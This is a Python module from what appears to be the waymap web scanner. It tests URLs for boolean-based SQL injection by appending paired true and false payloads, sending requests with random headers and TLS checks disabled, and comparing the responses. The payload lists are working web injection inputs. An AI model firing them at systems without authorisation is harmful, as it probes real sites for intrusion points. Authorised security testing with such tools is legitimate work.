# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# boolean.py (own logic)

import requests
import random
import string
import time
from colorama import Fore, Style, init
import warnings
from lib.parse.random_headers import generate_random_headers
from lib.injection.sqlin.sql import abort_all_tests


init(autoreset=True)

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

TRUE_PAYLOADS = [
    "' AND 2*3*8=6*8 AND 'randomString'='randomString",
    "' AND 3*2>(1*5) AND 'randomString'='randomString",
    "' AND 3*2*0>=0 AND 'randomString'='randomString"
]

FALSE_PAYLOADS = [
    "' AND 2*3*8=6*9 AND 'randomString'='randomString",
    "' AND 3*3<(2*4) AND 'randomString'='randomString",
    "' AND (3*3*0)=(2*4*1*0) AND 'randomString'='randomString"
]

headers = generate_random_headers()


def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def replace_placeholders(payload, rand_str):
    return payload.replace("randomString", rand_str)

def test_payload(url, payload, retries=2):
    response_signatures = []
    for _ in range(retries):
        try:
            full_url = url + payload.replace("randomString", generate_random_string())
            response = requests.get(full_url, headers=headers, verify=False, timeout=10)
            response_signatures.append((response.status_code, len(response.text), response.text[:100]))
        except requests.RequestException:
            response_signatures.append(None)  
    return response_signatures

def is_vulnerable(url):
    true_signatures = []
    false_signatures = []
    rand_str = generate_random_string()

    print(f"[{Fore.BLUE}{time.strftime('%H:%M:%S', time.localtime())}{Style.RESET_ALL}] [{Fore.GREEN}Testing{Style.RESET_ALL}] Testing URL: {url}")

    for payload in TRUE_PAYLOADS:
        replaced_payload = replace_placeholders(payload, rand_str)
        print(f"[{Fore.BLUE}{time.strftime('%H:%M:%S', time.localtime())}{Style.RESET_ALL}] [{Fore.GREEN}Testing{Style.RESET_ALL}] Payload: {replaced_payload}")
        true_signatures.extend(test_payload(url, replaced_payload))

    for payload in FALSE_PAYLOADS:
        replaced_payload = replace_placeholders(payload, rand_str)
        print(f"[{Fore.BLUE}{time.strftime('%H:%M:%S', time.localtime())}{Style.RESET_ALL}] [{Fore.GREEN}Testing{Style.RESET_ALL}] Payload: {replaced_payload}")
        false_signatures.extend(test_payload(url, replaced_payload))

    true_signatures = [sig for sig in true_signatures if sig is not None]
    false_signatures = [sig for sig in false_signatures if sig is not None]

    if true_signatures and false_signatures:
        true_pattern = set(true_signatures)
        false_pattern = set(false_signatures)
        
        if true_pattern != false_pattern:
            print(f"\n{Style.BRIGHT}[{Fore.GREEN}VULN{Style.RESET_ALL}] URL: {url}")
            print(f"{Style.BRIGHT}[{Fore.CYAN}Test Name{Style.RESET_ALL}]: Boolean-based SQLi")
            print(f"{Style.BRIGHT}[{Fore.CYAN}Target URL{Style.RESET_ALL}]: {url}")
            return True

    print(f"{Fore.RED}[!] No Boolean Based vulnerability detected at: {url}{Style.RESET_ALL}")
    return False

def process_urls(urls):
    global abort_all_tests
    for url in urls:
        if abort_all_tests:
            break
        
        try:
            if is_vulnerable(url):
                print(f"\n{Style.BRIGHT}[{Fore.YELLOW}Vulnerable URL Found{Style.RESET_ALL}] {url}")
                break
        except KeyboardInterrupt:
            print(f"\n{Style.BRIGHT}{Fore.YELLOW}Process interrupted by user.{Style.RESET_ALL}")
            while True:
                user_input = input(f"{Style.BRIGHT}{Fore.CYAN}Enter 'n' for next URL or 'e' to exit all tests: {Style.RESET_ALL}")
                if user_input.lower() == 'n':
                    print(f"{Style.BRIGHT}{Fore.GREEN}Continuing with next URL...{Style.RESET_ALL}")
                    break
                elif user_input.lower() == 'e':
                    abort_all_tests = True  
                    print(f"{Style.BRIGHT}{Fore.RED}Exiting all SQL Injection tests...{Style.RESET_ALL}")
                    return
                elif user_input == '':
                    print(f"{Style.BRIGHT}{Fore.GREEN}Resuming scan...{Style.RESET_ALL}")
                    break  
                else:
                    print(f"{Style.BRIGHT}{Fore.YELLOW}Invalid input, please try again.{Style.RESET_ALL}")
